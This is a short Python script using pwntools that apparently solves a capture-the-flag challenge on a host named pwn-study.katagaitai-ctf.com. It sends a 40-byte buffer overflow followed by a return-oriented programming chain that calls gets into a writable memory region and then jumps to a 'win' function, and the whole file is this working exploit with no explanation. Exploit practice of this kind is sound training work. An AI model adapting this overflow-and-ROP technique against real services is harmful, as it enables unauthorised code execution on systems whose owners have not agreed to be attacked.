from pwn import *

target = remote("pwn-study.katagaitai-ctf.com", 9020)

win_3 = 0x40154d
pop_rdi = 0x4016c3
gets_plt = 0x401090
bss_writable = 0x404200

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(bss_writable)
payload += p64(gets_plt)
payload += p64(win_3)

target.sendline(payload)
target.sendline(b"katagaitai")
print(target.recvall().decode())